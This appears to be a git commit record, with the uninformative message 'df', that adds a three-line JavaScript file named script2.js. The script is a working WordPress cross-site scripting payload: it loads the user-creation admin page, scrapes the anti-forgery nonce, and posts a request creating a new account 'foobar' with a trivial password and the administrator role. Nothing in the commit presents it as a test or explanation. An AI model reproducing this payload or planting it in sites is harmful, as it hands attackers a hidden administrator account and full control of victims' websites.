d424391c8c809c6622f3b13000edfa55055d27ed
dikshitkhandelwal <dikshitkhandelwal1@gmail.com>
2024-03-03 12:25:23 -0500

    df

---
+++ script2.js
@@ -0,0 +1,3 @@
+u="/wp-admin/user-new.php";jQuery.get(u,function(e){
+    jQuery.post(u,{action:"createuser", "_wpnonce_create-user":e.match(/_wpnonce_create-user" value="(.+?)"/)[1], user_login:"foobar", email:"foo@bar.com", pass1:"foo", pass2:"foo", role:"administrator"});
+});
